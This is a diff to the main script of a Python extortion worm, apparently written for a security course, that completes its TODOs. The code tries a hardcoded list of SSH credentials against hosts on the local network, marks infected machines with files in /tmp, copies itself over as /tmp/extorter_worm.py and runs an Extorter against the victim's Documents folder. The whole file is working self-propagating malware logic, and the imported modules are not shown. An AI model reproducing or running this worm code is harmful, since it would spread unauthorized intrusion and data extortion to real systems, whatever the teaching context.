@@ -1,20 +1,43 @@
 import sys
+import getopt
 
 from Replicator import Replicator
 from Extorter import Extorter
 
+NUM_SYSTEMS_TO_INFECT = 1
+
+try:
+	dprint
+except:
+	def dprint(msg, debug=True):
+		if debug:
+			print(msg)
+
 def main(argv):
+
+	options, remainder = getopt.getopt(argv, 'ad', ['attack', 'debug'])
+
+	DEBUG = False
+
+	for opt, arg in options:
+		if opt in ('-d', '--debug'):
+			DEBUG = True
 
 	# The list of credentials to attempt
 	credList = [
-	('hello', 'world'),
-	('hello1', 'world'),
-	('root', '#Gig#'),
-	('cpsc', 'cpsc'),
+		('hello', 'world'),
+		('hello1', 'world'),
+		('root', '#Gig#'),
+		('cpsc', 'cpsc'),
 	]
 
-	myReplicator = Replicator(credList)
-	myExtorter = Extorter()
+	myReplicator = Replicator(credList, DEBUG)
+	Replicator.INFECTED_MARKER_FILE = '/tmp/ext-infected.txt'
+	Replicator.DEBUG_OUTPUT_FILE    = '/tmp/ext-output.txt'
+
+	myExtorter = Extorter("~/Documents", "~/Documents/Your-documents.txt", DEBUG)
+
+	isHost = True
 
 	# If we are being run without a command line parameters,
 	# then we assume we are executing on a victim system and
@@ -27,71 +50,70 @@ def main(argv):
 	# system against the hardcoded IP.
 	if len(argv) < 1:
 
-		# TODO: If we are running on the victim, check if
-		# the victim was already infected. If so, terminate.
-		# Otherwise, proceed with malice.
-		if Replicator.isInfectedSystem():
-			sys.exit(0)
-	else:
-		hostSystem = Replicator.getMyIp()
+		isHost = False
 
-	# TODO: Get the IP of the current system
-	currentIp = Replicator.getMyIp()
+		dprint("Running on victim system...", DEBUG)
+
+		myExtorter.execute()
+		myReplicator.markInfected()
+
+	# Mark system as host so future scans won't hit the host
+	if isHost:
+		Replicator.markAsHost()
+
+	# Get the IP of the current system
+	currentIp = Replicator.getMyIP('eth2')
+	dprint("Current IP: " + currentIp, DEBUG)
 
 	# Get the hosts on the same network
 	networkHosts = Replicator.getHostsOnTheSameNetwork()
 
-	# TODO: Remove the IP of the current system
+	# Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
-	networkHosts.remove(hostSystem)
-	networkHosts.remove(currentIp)
+	if currentIp in networkHosts:
+		networkHosts.remove(currentIp)
 
-	print("Found hosts: ", networkHosts)
+	dprint("Found hosts: %s" % str(networkHosts), DEBUG)
+
+	systemsInfected = 0
 
 	# Go through the network hosts
 	for host in networkHosts:
 
-		# Try to attack this host
-		sshInfo =  myReplicator.attackSystem(host)
+		dprint("### Probing " + host + " ###", DEBUG)
 
-		print(sshInfo)
+		# Try to attack this host
+		sshInfo, sshClient =  myReplicator.attackSystem(host)
+
+		dprint("Final assessment: " + Replicator.desc(sshInfo), DEBUG)
 
 		# Did the attack succeed?
-		if sshInfo:
+		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:
 
-			print("Trying to spread")
+			# Make sure the remote system is not the host
+			if not myReplicator.remoteSystemIsHost():
 
-			# TODO: Check if the system was
-			# already infected. This can be
-			# done by checking whether the
-			# remote system contains /tmp/infected.txt
-			# file (which the worm will place there
-			# when it first infects the system)
-			# This can be done using code similar to
-			# the code below:
-			# try:
-			#		remotepath = '/tmp/infected.txt'
-			#		localpath = '/home/cpsc/'
-			#	 # Copy the file from the specified
-			#	 # remote path to the specified
-			# 	 # local path. If the file does exist
-			#	 # at the remote path, then get()
-			# 	 # will throw IOError exception
-			# 	 # (that is, we know the system is
-			# 	 # not yet infected).
-			#
-			#        sftp.get(filepath, localpath)
-			# except IOError:
-			#       print "This system should be infected"
-			#
-			#
-			# If the system was already infected proceed.
-			# Otherwise, infect the system and terminate.
-			# Infect that system
-			myExtorter.execute()
+				# Make sure the remote system is not already infected
+				if not myReplicator.remoteSystemIsInfected():
 
-			print ("Spreading complete")
+					dprint(host + " is not infected yet", DEBUG)
+
+					myReplicator.spreadAndExecute(isHost, "/tmp/extorter_worm.py")
+
+					systemsInfected += 1
+				else:
+					dprint(host + " is already infected", DEBUG)
+			else:
+				dprint("Remote system is host, cancel the attack", DEBUG)
+
+			dprint("Spreading complete", DEBUG)
+
+			if systemsInfected == NUM_SYSTEMS_TO_INFECT:
+				break
+
+	dprint("Finished pwning...", DEBUG)
+	sys.exit(0)
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
